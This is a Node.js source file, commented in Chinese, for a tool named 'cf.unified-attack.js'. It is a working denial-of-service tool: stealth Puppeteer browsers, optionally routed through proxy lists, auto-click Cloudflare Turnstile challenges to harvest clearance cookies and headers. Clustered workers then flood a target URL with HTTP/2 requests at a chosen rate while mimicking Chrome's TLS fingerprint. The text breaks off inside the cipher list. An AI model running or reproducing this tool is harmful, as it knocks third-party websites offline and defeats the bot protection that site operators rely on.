#!/usr/bin/env node
// cf.unified-attack.js - 统一的 Cookie 获取和攻击工具
// 等待所有 Cookie 获取完成后再启动攻击

const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const fs = require('fs');
const path = require('path');
const cluster = require('cluster');
const os = require('os');
const { spawn } = require('child_process');
const readline = require('readline');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const crypto = require('crypto');
const { once } = require('events');

require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

const C = {
    reset: "\x1b[0m", gray: "\x1b[90m", cyan: "\x1b[36m", yellow: "\x1b[33m",
    magenta: "\x1b[35m", green: "\x1b[32m", white: "\x1b[37m", blue: "\x1b[34m", red: "\x1b[31m"
};

function ts() { 
    return new Date().toISOString().replace('T', ' ').split('.')[0]; 
}

function sleep(ms) { 
    return new Promise(r => setTimeout(r, ms)); 
}

function getBrowserPath() {
    const paths = os.platform() === 'win32' 
        ? ['C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 
           'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe',
           'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe',
           'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe']
        : ['/usr/bin/google-chrome', '/usr/bin/chromium-browser', '/usr/bin/chromium', '/usr/bin/microsoft-edge'];
    return paths.find(p => fs.existsSync(p)) || null;
}

// ============================================================
// 命令行参数解析
// ============================================================
const args = process.argv.slice(2);

if (args.length < 4) {
    console.log(`${C.cyan}cf.unified-attack.js - 统一的 Cookie 获取和攻击工具${C.reset}\n`);
    console.log(`用法: node cf.unified-attack.js <url> <duration> <workers> <qps> [options]\n`);
    console.log(`参数:`);
    console.log(`  url              目标 URL`);
    console.log(`  duration         持续时间（秒）`);
    console.log(`  workers          Worker 进程数`);
    console.log(`  qps              每秒请求数\n`);
    console.log(`选项:`);
    console.log(`  --direct         直连模式（不使用代理）`);
    console.log(`  --proxy=file     使用代理文件`);
    console.log(`  --parallel=N     Cookie 获取并行数（默认: 10）`);
    console.log(`  --headless       无头模式`);
    console.log(`  --debug          调试模式\n`);
    console.log(`示例:`);
    console.log(`  ${C.gray}# 直连模式${C.reset}`);
    console.log(`  node cf.unified-attack.js https://target.com 120 16 1000 --direct\n`);
    console.log(`  ${C.gray}# 代理模式${C.reset}`);
    console.log(`  node cf.unified-attack.js https://target.com 120 16 1000 --proxy=proxy.txt --parallel=50\n`);
    process.exit(1);
}

const targetUrl = args[0];
const duration = parseInt(args[1]);
const workers = parseInt(args[2]);
const qps = parseInt(args[3]);

const directMode = args.includes('--direct');
const proxyFlag = args.find(a => a.startsWith('--proxy='));
const proxyFile = proxyFlag ? proxyFlag.split('=')[1] : null;
const parallelFlag = args.find(a => a.startsWith('--parallel='));
const parallel = parallelFlag ? parseInt(parallelFlag.split('=')[1]) : 10;
const headlessMode = args.includes('--headless');
const debugMode = args.includes('--debug');

if (!directMode && !proxyFile) {
    console.error(`${C.red}错误: 必须指定 --direct 或 --proxy=file${C.reset}`);
    process.exit(1);
}

if (proxyFile && !fs.existsSync(proxyFile)) {
    console.error(`${C.red}错误: 代理文件不存在: ${proxyFile}${C.reset}`);
    process.exit(1);
}

// ============================================================
// 阶段 1: Cookie 获取部分
// ============================================================

if (cluster.isMaster) {
    console.clear();
    console.log(`\n${C.cyan}${'='.repeat(61)}${C.reset}`);
    console.log(`${C.cyan}           CF 统一攻击系统${C.reset}`);
    console.log(`${C.cyan}${'='.repeat(61)}${C.reset}\n`);
    
    const proxyList = proxyFile ? fs.readFileSync(proxyFile, 'utf8').split(/\r?\n/).filter(s => s.trim() && !s.startsWith('#')) : [];
    
    console.log(`  ${C.white}目标${C.reset}       ${C.cyan}${targetUrl}${C.reset}`);
    console.log(`  ${C.white}时长${C.reset}       ${C.yellow}${duration}秒${C.reset}  ${C.gray}|${C.reset}  ${C.white}线程${C.reset} ${C.yellow}${workers}${C.reset}  ${C.gray}|${C.reset}  ${C.white}QPS${C.reset} ${C.yellow}${qps}${C.reset}`);
    if (proxyFile) {
        console.log(`  ${C.white}代理${C.reset}       ${C.green}${proxyList.length}${C.reset}  ${C.gray}|${C.reset}  ${C.white}并发${C.reset} ${C.green}${parallel}${C.reset}`);
    } else {
        console.log(`  ${C.white}模式${C.reset}       ${C.magenta}直连${C.reset}`);
    }
    console.log(`\n${C.gray}${'-'.repeat(61)}${C.reset}`);
    console.log(`${C.yellow}[阶段 1/2]${C.reset} 获取 Cookie...\n`);

    // Linux 内存优化
    if (process.platform === 'linux') {
        try {
            process.env.TMPDIR = '/dev/shm';
            process.env.XDG_CACHE_HOME = '/dev/shm';
        } catch (_) {}
    }

    const launchArgs = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-infobars',
        '--disable-features=WebRtcHideLocalIpsWithMdns,PrivacySandboxAdsAPIs',
        '--disable-blink-features=AutomationControlled',
        '--disk-cache-size=0',
        '--media-cache-size=0',
        '--disable-application-cache',
        '--disable-offline-load-stale-cache'
    ];

    function pickUA() {
        const chromeMajors = [120, 121, 122, 123, 124, 125];
        const major = chromeMajors[Math.floor(Math.random() * chromeMajors.length)];
        const full = `${major}.0.0.0`;
        return {
            ua: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${full} Safari/537.36`,
            major,
            full
        };
    }

    // 全局浏览器进程跟踪
    const activeBrowsers = new Set();
    let isShuttingDown = false;

    function registerBrowser(browser) {
        if (isShuttingDown) {
            browser.close().catch(() => {});
            return;
        }
        activeBrowsers.add(browser);
    }

    function unregisterBrowser(browser) {
        activeBrowsers.delete(browser);
    }

    async function getCookieDirect() {
        if (isShuttingDown) return null;
        
        let browser = null;
        let page = null;
        let capturedHeaders = null;
        let challengeToken = null;
        let redirectUrl = null;
        
        try {
            if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 启动浏览器（直连模式）`);
            
            const picked = pickUA();
            const browserPath = getBrowserPath();
            
            if (!browserPath) {
                throw new Error('未找到 Chrome 或 Edge 浏览器，请安装后重试');
            }
            
            browser = await puppeteer.launch({
                headless: headlessMode ? 'new' : false,
                defaultViewport: null,
                executablePath: browserPath,
                ignoreDefaultArgs: headlessMode ? ['--enable-automation'] : undefined,
                timeout: 60000,
                args: launchArgs
            });
            
            registerBrowser(browser);
            
            const pages = await browser.pages();
            page = pages[0] || await browser.newPage();
            
            await page.setUserAgent(picked.ua);
            await page.setExtraHTTPHeaders({
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Sec-CH-UA': `"Chromium";v="${picked.major}", "Google Chrome";v="${picked.major}", "Not=A?Brand";v="99"`,
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-CH-UA-Arch': '"x86"',
                'Sec-CH-UA-Bitness': '"64"',
                'Sec-CH-UA-Full-Version': `"${picked.major}.0.0.0"`,
                'Sec-CH-UA-Full-Version-List': `"Chromium";v="${picked.major}.0.0.0", "Google Chrome";v="${picked.major}.0.0.0", "Not=A?Brand";v="99.0.0.0"`,
                'Sec-CH-UA-Model': '""',
                'Sec-CH-UA-Platform-Version': '"15.0.0"'
            });
            
            await page.setRequestInterception(true);
            page.on('request', request => {
                const url = request.url();
                if (url === targetUrl && !capturedHeaders) {
                    capturedHeaders = request.headers();
                    if (debugMode) {
                        console.log(`${C.gray}[${ts()}]${C.reset} 捕获浏览器真实请求头:`);
                        console.log(JSON.stringify(capturedHeaders, null, 2));
                        
                        // 显示捕获到的 Client Hints
                        const clientHints = Object.keys(capturedHeaders).filter(k => k.toLowerCase().startsWith('sec-ch-'));
                        if (clientHints.length > 0) {
                            console.log(`${C.green}✓ 捕获到 ${clientHints.length} 个 Client Hints 请求头${C.reset}`);
                        }
                    }
                }
                request.continue();
            });
            
            let lastStatusCode = null;
            page.on('response', resp => {
                try {
                    const req = resp.request();
                    if (req && req.isNavigationRequest() && req.frame() === page.mainFrame()) {
                        lastStatusCode = resp.status();
                        const respUrl = resp.url();
                        if (respUrl.includes('__cf_chl_tk=')) {
                            redirectUrl = respUrl;
                            const match = respUrl.match(/__cf_chl_tk=([^&]+)/);
                            if (match) {
                                challengeToken = match[1];
                                if (debugMode) {
                                    console.log(`${C.gray}[${ts()}]${C.reset} 捕获挑战令牌: ${challengeToken.substring(0, 30)}...`);
                                }
                            }
                        }
                    }
                } catch (_) {}
            });
            
            if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 访问目标: ${targetUrl}`);
            const resp = await page.goto(targetUrl, { 
                waitUntil: 'domcontentloaded', 
                timeout: 30000 
            });
            
            if (resp) lastStatusCode = resp.status();
            
            try {
                const { w, h } = await page.evaluate(() => {
                    const el = document.documentElement;
                    return { w: el.clientWidth || 1280, h: el.clientHeight || 800 };
                });
                await page.setViewport({ width: w, height: h });
            } catch (_) {}
            
            const initialCookies = await page.cookies();
            const initialClearance = initialCookies.find(x => x.name === 'cf_clearance');
            const initialValue = initialClearance ? initialClearance.value : null;
            const initialCookieCount = initialCookies.length;
            
            async function findCfWidget() {
                const frames = page.frames();
                const cfFrame = frames.find(f => 
                    f.url().includes('challenges') || 
                    f.url().includes('turnstile')
                );
                
                if (!cfFrame) return null;
                
                try {
                    const el = await cfFrame.frameElement();
                    const box = await el.boundingBox();
                    if (!box) return null;
                    
                    return {
                        rect: box,
                        checkboxPoint: {
                            x: box.x + box.width * 0.18,
                            y: box.y + box.height * 0.5
                        }
                    };
                } catch (_) {
                    return null;
                }
            }
            
            const solveDeadline = Date.now() + 30000;
            let solved = false;
            let clickCount = 0;
            
            if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} ${C.yellow}等待页面加载...${C.reset}`);
            
            while (Date.now() < solveDeadline) {
                const cookies = await page.cookies();
                const clearance = cookies.find(x => x.name === 'cf_clearance');
                const widget = await findCfWidget();
                
                // 成功条件：
                // 1. 有 cf_clearance 且值改变，无验证框，状态码正常
                // 2. 无点击盾场景：状态码 200/304，Cookie 数量增加（JS 加载完成）
                if (clearance && 
                    clearance.value !== initialValue && 
                    !widget && 
                    (lastStatusCode === 200 || lastStatusCode === 304)) {
                    solved = true;
                    console.log(`${C.green}[成功] CF 验证通过${C.reset} ${C.gray}[${clearance.value.substring(0, 16)}...]${C.reset}`);
                    break;
                }
                
                // 无点击盾场景：页面正常加载，Cookie 已设置
                if (!widget && 
                    (lastStatusCode === 200 || lastStatusCode === 304) && 
                    cookies.length > initialCookieCount && 
                    Date.now() - (page._loadedTs || 0) > 3000) {
                    solved = true;
                    console.log(`${C.green}[成功] 页面加载完成${C.reset} ${C.gray}[${cookies.length} cookies]${C.reset}`);
                    break;
                }
                
                if (!page._loadedTs && (lastStatusCode === 200 || lastStatusCode === 304)) {
                    page._loadedTs = Date.now();
                }
                
                if (widget) {
                    const now = Date.now();
                    if (now - (page._lastClickTs || 0) > 1500) {
                        clickCount++;
                        const cx = widget.checkboxPoint.x + (Math.random() * 4 - 2);
                        const cy = widget.checkboxPoint.y + (Math.random() * 4 - 2);
                        
                        if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 点击验证框 #${clickCount}`);
                        
                        try {
                            await page.mouse.move(cx, cy);
                            await page.mouse.down();
                            await sleep(50 + Math.random() * 50);
                            await page.mouse.up();
                            page._lastClickTs = now;
                            await page.waitForNavigation({ 
                                waitUntil: 'domcontentloaded', 
                                timeout: 3000 
                            }).catch(() => {});
                        } catch (_) {}
                    }
                } else if (headlessMode) {
                    const frames = page.frames();
                    const cfFrame = frames.find(f => f.url().includes('turnstile'));
                    if (cfFrame) {
                        try {
                            const checkbox = await cfFrame.$('input[type="checkbox"]');
                            if (checkbox) {
                                await checkbox.click();
                                await sleep(1000);
                            }
                        } catch (_) {}
                    }
                }
                
                await sleep(200);
            }
            
            if (!solved) {
                // 静默失败，不输出错误信息
                await browser.close();
                return null;
            }
            
            const finalCookies = await page.cookies();
            const cfClearance = finalCookies.find(x => x.name === 'cf_clearance');
            
            // 不强制要求 cf_clearance，只要有 Cookie 就可以
            if (finalCookies.length === 0) {
                console.log(`${C.red}✗ 未获取到 Cookie${C.reset}`);
                await browser.close();
                return null;
            }
            
            const cookieString = finalCookies
                .map(c => `${c.name}=${c.value}`)
                .join('; ');
            
            const title = await page.title();
            
            unregisterBrowser(browser);
            await browser.close();
            
            return {
                proxy: 'direct',
                cookie: cookieString,
                cf_clearance: cfClearance ? cfClearance.value : null,
                title: title,
                status: lastStatusCode,
                timestamp: new Date().toISOString(),
                headers: capturedHeaders || {},
                challengeToken: challengeToken,
                redirectUrl: redirectUrl
            };
            
        } catch (err) {
            console.error(`${C.red}✗ 获取失败: ${err.message}${C.reset}`);
            if (browser) {
                try { 
                    unregisterBrowser(browser);
                    await browser.close(); 
                } catch (_) {}
            }
            return null;
        }
    }

    async function getCookieWithProxy(proxyStr) {
        if (isShuttingDown) return null;
        
        let browser = null;
        let page = null;
        let capturedHeaders = null;
        let challengeToken = null;
        let redirectUrl = null;
        
        try {
            const proxyUrl = proxyStr.startsWith('http') ? proxyStr : `http://${proxyStr}`;
            if (debugMode) console.log(`${C.gray}[${ts()}]${C.reset} 处理代理: ${proxyUrl}`);
            
            const picked = pickUA();
            const browserPath = getBrowserPath();
            
            if (!browserPath) {
                throw new Error('未找到 Chrome 或 Edge 浏览器，请安装后重试');
            }
            
            browser = await puppeteer.launch({
                headless: headlessMode ? 'new' : false,
                defaultViewport: null,
                executablePath: browserPath,
                ignoreDefaultArgs: headlessMode ? ['--enable-automation'] : undefined,
                timeout: 60000,
                args: [...launchArgs, `--proxy-server=${proxyUrl}`]
            });
            
            registerBrowser(browser);
            
            const pages = await browser.pages();
            page = pages[0] || await browser.newPage();
            
            await page.setUserAgent(picked.ua);
            await page.setExtraHTTPHeaders({
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Sec-CH-UA': `"Chromium";v="${picked.major}", "Google Chrome";v="${picked.major}", "Not=A?Brand";v="99"`,
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-CH-UA-Arch': '"x86"',
                'Sec-CH-UA-Bitness': '"64"',
                'Sec-CH-UA-Full-Version': `"${picked.major}.0.0.0"`,
                'Sec-CH-UA-Full-Version-List': `"Chromium";v="${picked.major}.0.0.0", "Google Chrome";v="${picked.major}.0.0.0", "Not=A?Brand";v="99.0.0.0"`,
                'Sec-CH-UA-Model': '""',
                'Sec-CH-UA-Platform-Version': '"15.0.0"'
            });
            
            await page.setRequestInterception(true);
            page.on('request', request => {
                const url = request.url();
                if (url === targetUrl && !capturedHeaders) {
                    capturedHeaders = request.headers();
                }
                request.continue();
            });
            
            let lastStatusCode = null;
            page.on('response', resp => {
                try {
                    const req = resp.request();
                    if (req && req.isNavigationRequest() && req.frame() === page.mainFrame()) {
                        lastStatusCode = resp.status();
                        const respUrl = resp.url();
                        if (respUrl.includes('__cf_chl_tk=')) {
                            redirectUrl = respUrl;
                            const match = respUrl.match(/__cf_chl_tk=([^&]+)/);
                            if (match) {
                                challengeToken = match[1];
                                if (debugMode) {
                                    console.log(`${C.gray}[${ts()}]${C.reset} 捕获挑战令牌: ${challengeToken.substring(0, 30)}...`);
                                }
                            }
                        }
                    }
                } catch (_) {}
            });
            
            const resp = await page.goto(targetUrl, { 
                waitUntil: 'domcontentloaded', 
                timeout: 30000 
            });
            
            if (resp) lastStatusCode = resp.status();
            
            try {
                const { w, h } = await page.evaluate(() => {
                    const el = document.documentElement;
                    return { w: el.clientWidth || 1280, h: el.clientHeight || 800 };
                });
                await page.setViewport({ width: w, height: h });
            } catch (_) {}
            
            const initialCookies = await page.cookies();
            const initialClearance = initialCookies.find(x => x.name === 'cf_clearance');
            const initialValue = initialClearance ? initialClearance.value : null;
            const initialCookieCount = initialCookies.length;
            
            async function findCfWidget() {
                const frames = page.frames();
                const cfFrame = frames.find(f => 
                    f.url().includes('challenges') || 
                    f.url().includes('turnstile')
                );
                
                if (!cfFrame) return null;
                
                try {
                    const el = await cfFrame.frameElement();
                    const box = await el.boundingBox();
                    if (!box) return null;
                    
                    return {
                        rect: box,
                        checkboxPoint: {
                            x: box.x + box.width * 0.18,
                            y: box.y + box.height * 0.5
                        }
                    };
                } catch (_) {
                    return null;
                }
            }
            
            const solveDeadline = Date.now() + 30000;
            let solved = false;
            let clickCount = 0;
            
            while (Date.now() < solveDeadline) {
                const cookies = await page.cookies();
                const clearance = cookies.find(x => x.name === 'cf_clearance');
                const widget = await findCfWidget();
                
                // 成功条件：
                // 1. 有 cf_clearance 且值改变，无验证框，状态码正常
                // 2. 无点击盾场景：状态码 200/304，Cookie 数量增加（JS 加载完成）
                if (clearance && 
                    clearance.value !== initialValue && 
                    !widget && 
                    (lastStatusCode === 200 || lastStatusCode === 304)) {
                    solved = true;
                    if (debugMode) console.log(`${C.green}✓ ${proxyStr} CF 验证成功${C.reset}`);
                    break;
                }
                
                // 无点击盾场景：页面正常加载，Cookie 已设置
                if (!widget && 
                    (lastStatusCode === 200 || lastStatusCode === 304) && 
                    cookies.length > initialCookieCount && 
                    Date.now() - (page._loadedTs || 0) > 3000) {
                    solved = true;
                    if (debugMode) console.log(`${C.green}✓ ${proxyStr} 页面加载完成${C.reset}`);
                    break;
                }
                
                if (!page._loadedTs && (lastStatusCode === 200 || lastStatusCode === 304)) {
                    page._loadedTs = Date.now();
                }
                
                if (widget) {
                    const now = Date.now();
                    if (now - (page._lastClickTs || 0) > 1500) {
                        clickCount++;
                        const cx = widget.checkboxPoint.x + (Math.random() * 4 - 2);
                        const cy = widget.checkboxPoint.y + (Math.random() * 4 - 2);
                        
                        try {
                            await page.mouse.move(cx, cy);
                            await page.mouse.down();
                            await sleep(50 + Math.random() * 50);
                            await page.mouse.up();
                            page._lastClickTs = now;
                            await page.waitForNavigation({ 
                                waitUntil: 'domcontentloaded', 
                                timeout: 3000 
                            }).catch(() => {});
                        } catch (_) {}
                    }
                } else if (headlessMode) {
                    const frames = page.frames();
                    const cfFrame = frames.find(f => f.url().includes('turnstile'));
                    if (cfFrame) {
                        try {
                            const checkbox = await cfFrame.$('input[type="checkbox"]');
                            if (checkbox) {
                                await checkbox.click();
                                await sleep(1000);
                            }
                        } catch (_) {}
                    }
                }

                await sleep(200);
            }
            if (!solved) {
                // 静默失败，不输出错误信息
                unregisterBrowser(browser);
                await browser.close();
                return null;
            }

            const finalCookies = await page.cookies();
            const cfClearance = finalCookies.find(x => x.name === 'cf_clearance');

            // 不强制要求 cf_clearance，只要有 Cookie 就可以
            if (finalCookies.length === 0) {
                console.log(`${C.red}✗ 未获取到 Cookie${C.reset}`);
                unregisterBrowser(browser);
                await browser.close();
                return null;
            }

            const cookieString = finalCookies
                .map(c => `${c.name}=${c.value}`)
                .join('; ');
            
            const title = await page.title();
            
            unregisterBrowser(browser);
            await browser.close();
            
            return {
                proxy: proxyStr,
                cookie: cookieString,
                cf_clearance: cfClearance ? cfClearance.value : null,
                title: title,
                status: lastStatusCode,
                timestamp: new Date().toISOString(),
                headers: capturedHeaders || {},
                challengeToken: challengeToken,
                redirectUrl: redirectUrl
            };
            
        } catch (err) {
            if (debugMode) console.error(`${C.red}✗ ${proxyStr} 失败: ${err.message}${C.reset}`);
            if (browser) {
                try { 
                    unregisterBrowser(browser);
                    await browser.close(); 
                } catch (_) {}
            }
            return null;
        }
    }

    async function cleanup() {
        isShuttingDown = true;
        
        // 清空当前行，避免与 QPS 统计混在一起
        readline.cursorTo(process.stdout, 0);
        readline.clearLine(process.stdout, 0);
        
        console.log(`\n${C.cyan}清理资源中...${C.reset}`);
        
        await new Promise(resolve => setTimeout(resolve, 500));
        
        if (activeBrowsers.size > 0) {
            console.log(`${C.gray}关闭 ${activeBrowsers.size} 个跟踪的浏览器进程...${C.reset}`);
            const browsers = Array.from(activeBrowsers);
            activeBrowsers.clear();
            
            await Promise.all(browsers.map(async (browser) => {
                try {
                    await browser.close();
                } catch (err) {}
            }));
        }
        
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        if (os.platform() !== 'win32') {
            try {
                const { exec } = require('child_process');
                console.log(`\n${C.gray}强制清理残留的浏览器进程...${C.reset}`);
                
                const killCommands = [
                    'pkill -9 -f chrome',
                    'pkill -9 -f chromium',
                    'killall -9 chrome 2>/dev/null',
                    'killall -9 chromium 2>/dev/null'
                ];
                
                for (const cmd of killCommands) {
                    await new Promise((resolve) => {
                        exec(cmd, () => resolve());
                    });
                }
                
                console.log(`${C.gray}已清理残留进程${C.reset}`);
            } catch (err) {}
        }
        
        console.log(`\n${C.green}✓ 清理完成${C.reset}`);
    }

    process.on('SIGINT', () => {
        // 清空当前行
        readline.cursorTo(process.stdout, 0);
        readline.clearLine(process.stdout, 0);
        
        console.log(`\n${C.yellow}收到退出信号 (Ctrl+C)${C.reset}`);
        cleanup().then(() => {
            process.exit(0);
        }).catch(() => {
            process.exit(1);
        });
    });

    process.on('SIGTERM', () => {
        console.log(`\n${C.yellow}收到终止信号${C.reset}`);
        cleanup().then(() => {
            process.exit(0);
        }).catch(() => {
            process.exit(1);
        });
    });

    process.on('uncaughtException', (err) => {
        console.error(`\n${C.red}未捕获的异常: ${err.message}${C.reset}`);
        cleanup().then(() => {
            process.exit(1);
        }).catch(() => {
            process.exit(1);
        });
    });

    // ============================================================
    // 主流程：获取所有 Cookie
    // ============================================================

    (async () => {
        let cookiePairs = [];
        
        if (directMode) {
            const result = await getCookieDirect();
            if (result) {
                cookiePairs.push(result);
                console.log(`${C.green}✓ Cookie 获取成功${C.reset}\n`);
            } else {
                console.error(`${C.red}✗ Cookie 获取失败，退出${C.reset}`);
                process.exit(1);
            }
        } else {
            const proxyList = fs.readFileSync(proxyFile, 'utf8')
                .split(/\r?\n/)
                .map(s => s.trim())
                .filter(s => s && !s.startsWith('#'));
            
            console.log(`${C.cyan}处理 ${C.white}${proxyList.length}${C.reset} 个代理...\n`);
            
            const results = [];
            let processed = 0;
            let success = 0;
            let failed = 0;
            
            const chunks = [];
            for (let i = 0; i < proxyList.length; i += parallel) {
                chunks.push(proxyList.slice(i, i + parallel));
            }
            
            for (const chunk of chunks) {
                const promises = chunk.map(proxy => getCookieWithProxy(proxy));
                const chunkResults = await Promise.all(promises);
                
                for (const result of chunkResults) {
                    processed++;
                    if (result) {
                        success++;
                        results.push(result);
                    } else {
                        failed++;
                    }
                    
                    const progress = ((processed / proxyList.length) * 100).toFixed(1);
                    const successRate = ((success / processed) * 100).toFixed(1);
                    
                    process.stdout.write(`\r${C.gray}[${ts()}]${C.reset} 进度: ${processed}/${proxyList.length} (${progress}%) | 成功: ${success} | 失败: ${failed} | 成功率: ${successRate}%   `);
                }
            }
            
            console.log(`\n${C.gray}${'-'.repeat(61)}${C.reset}`);
            console.log(`${C.green}[完成] Cookie 获取完成${C.reset} ${C.white}${success}${C.reset}${C.gray}/${proxyList.length}${C.reset}`);
            console.log(`${C.gray}${'-'.repeat(61)}${C.reset}\n`);
            
            if (success === 0) {
                console.error(`${C.red}✗ 没有成功获取任何 Cookie，退出${C.reset}`);
                process.exit(1);
            }
            
            cookiePairs = results;
        }
        
        // 保存 Cookie 配对
        const pairsFile = 'unified-pairs.json';
        fs.writeFileSync(pairsFile, JSON.stringify(cookiePairs, null, 2));
        console.log(`${C.cyan}已保存${C.reset} ${pairsFile} ${C.gray}(${cookiePairs.length} 个配对)${C.reset}\n`);
        
        console.log(`${C.gray}${'-'.repeat(61)}${C.reset}`);
        console.log(`${C.yellow}[阶段 2/2]${C.reset} 启动攻击...\n`);
        
        process.env.ATTACK_TARGET = targetUrl;
        process.env.ATTACK_QPS = qps.toString();
        process.env.ATTACK_DURATION = (duration * 1000).toString();
        process.env.ATTACK_COOKIE_FILE = pairsFile;
        process.env.ATTACK_DEBUG = debugMode ? '1' : '0';
        
        console.log(`  ${C.white}配对数${C.reset}     ${C.green}${cookiePairs.length}${C.reset} Cookie-IP 绑定`);
        console.log(`  ${C.white}策略${C.reset}       ${C.magenta}HTTP/2 多路复用${C.reset} ${C.gray}(每线程3连接)${C.reset}`);
        console.log(`  ${C.white}预期${C.reset}       ${C.cyan}~${qps * workers} 请求/秒${C.reset} 总计\n`);

        let statusMap = {};

        cluster.setupMaster({
            execArgv: process.execArgv.concat(['--max-old-space-size=2048'])
        });

        const forkWorker = () => {
            const w = cluster.fork();
            w.on("message", msg => {
                if (msg.status) {
                    for (const code in msg.status) {
                        statusMap[code] = (statusMap[code] || 0) + msg.status[code];
                    }
                }
            });
        };

        function startWorkers() {
            for (let i = 0; i < workers; i++) {
                forkWorker();
            }
        }

        cluster.on("exit", (worker, code, signal) => {
            if (code !== 0 && !worker.exitedAfterDisconnect) {
                forkWorker();
            }
        });

        const printStats = () => {
            const codes = Object.keys(statusMap).sort((a, b) => a - b);
            if (codes.length === 0) return;

            const totalReqs = codes.reduce((sum, c) => sum + statusMap[c], 0);
            
            const statusStr = codes.map(c => {
                let color = c.startsWith('2') ? C.green : c.startsWith('4') ? C.yellow : C.red;
                return `${color}${c}${C.reset}:${statusMap[c]}`;
            }).join(' ');
            
            readline.cursorTo(process.stdout, 0);
            readline.clearLine(process.stdout, 0);
            
            process.stdout.write(`${C.cyan}[QPS]${C.reset} ${C.white}${totalReqs}${C.reset} req/s  ${C.gray}|${C.reset}  ${statusStr}`);
            
            statusMap = {};
        };

        const statsInterval = setInterval(printStats, 1000);

        console.log(`${C.green}[开始] 攻击已启动${C.reset}\n`);
        startWorkers();

        // 优雅关闭机制
        let isShuttingDown = false;
        
        function gracefulShutdown() {
            if (isShuttingDown) return;
            isShuttingDown = true;
            
            // 停止 QPS 统计，清空当前行
            clearInterval(statsInterval);
            readline.cursorTo(process.stdout, 0);
            readline.clearLine(process.stdout, 0);
            
            console.log(`\n\n${C.gray}${'-'.repeat(61)}${C.reset}`);
            console.log(`${C.yellow}[关闭] 正在优雅关闭...${C.reset}`);
            console.log(`${C.gray}${'-'.repeat(61)}${C.reset}\n`);
            
            // 通知所有 Worker 停止发送新请求
            for (const worker of Object.values(cluster.workers)) {
                if (worker && !worker.isDead()) {
                    worker.send({ cmd: 'shutdown' });
                }
            }
            
            // 等待 Worker 完成当前请求
            setTimeout(() => {
                console.log(`\n${C.yellow}[关闭] 发送终止信号...${C.reset}`);
                for (const worker of Object.values(cluster.workers)) {
                    if (worker && !worker.isDead()) {
                        worker.kill('SIGTERM');
                    }
                }
                
                // 强制退出
                setTimeout(() => {
                    console.log(`\n${C.green}[完成] 攻击已结束${C.reset}`);
                    console.log(`${C.gray}${'-'.repeat(61)}${C.reset}\n`);
                    process.exit(0);
                }, 3000);
            }, 5000);
        }
        
        setTimeout(gracefulShutdown, duration * 1000);

    })();

    return;
}

// ============================================================
// Worker 进程：执行攻击
// ============================================================

// Worker 进程关闭标志
let workerShuttingDown = false;
let activeSessions = [];

// 监听来自 Master 的关闭消息
process.on('message', (msg) => {
    if (msg.cmd === 'shutdown') {
        workerShuttingDown = true;
        debugLog('收到关闭指令，停止发送新请求');
        
        // 关闭所有活动的 session
        for (const session of activeSessions) {
            try {
                if (session && !session.closed && !session.destroyed) {
                    session.close();
                }
            } catch (_) {}
        }
        activeSessions = [];
    }
});

// 捕获 Worker 进程的所有错误
process.on('uncaughtException', (err) => {
    if (err.code === 'EPIPE' || err.code === 'ERR_IPC_CHANNEL_CLOSED') {
        // IPC 管道关闭错误，静默退出
        process.exit(0);
    }
});

process.on('unhandledRejection', () => {});

const target = new URL(process.env.ATTACK_TARGET);
const QPS = +process.env.ATTACK_QPS;
const DURATION_MS = +process.env.ATTACK_DURATION;
const COOKIE_PAIR_FILE = process.env.ATTACK_COOKIE_FILE;
const DEBUG = process.env.ATTACK_DEBUG === '1';

let cookiePairs = [];
let browserHeaders = null;
let challengeToken = null;
let redirectUrl = null;

// 全局状态码显示计数器（每种状态码最多显示 5 次）
const statusCodeDisplayCount = {};

function loadCookiePairs() {
    try {
        const rawData = fs.readFileSync(COOKIE_PAIR_FILE, 'utf8');
        const data = JSON.parse(rawData);
        
        if (Array.isArray(data)) {
            cookiePairs = data;
        } else if (data.pairs && Array.isArray(data.pairs)) {
            cookiePairs = data.pairs;
        }
        
        if (cookiePairs.length > 0) {
            browserHeaders = cookiePairs[0].headers || null;
            challengeToken = cookiePairs[0].challengeToken || null;
            redirectUrl = cookiePairs[0].redirectUrl || null;
        }
        
        return cookiePairs.length;
    } catch (err) {
        return 0;
    }
}

loadCookiePairs();

let statusCounter = {};

function debugLog(...args) {
    if (DEBUG) {
        const timestamp = new Date().toISOString().replace('T', ' ').split('.')[0];
        console.log(`[${timestamp}] [Worker ${process.pid}]`, ...args);
    }
}

// 固定使用 Chrome 122 TLS 配置，与捕获到的浏览器版本一致
const CHROME_TLS_PROFILE = {
    browserName: "Chrome-Windows",
    version: "122",
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    ciphers: [
        "TLS_AES_128_GCM_SHA256",
        "TLS_AES_256_GCM_SHA384",
        "TLS_CHACHA20_POLY1305_SHA256",
        "ECDHE-ECDSA-AES128-GCM-SHA256",
        "ECDHE-RSA-AES128-GCM-SHA256",
        "ECDHE-ECDSA-AES256-GCM-SHA384",
        "ECDHE-RSA-AES256-GCM-SHA384",
        "ECDHE-ECDSA-CHACHA20-POLY1305",
        "ECDHE-RSA-CHACHA20-POLY1305",
        "ECDHE-RSA-AES128-SHA",
        "ECDHE-RSA-AES256-SHA",
        "AES128-GCM-SHA256",
        "AES256-GCM-SHA384",
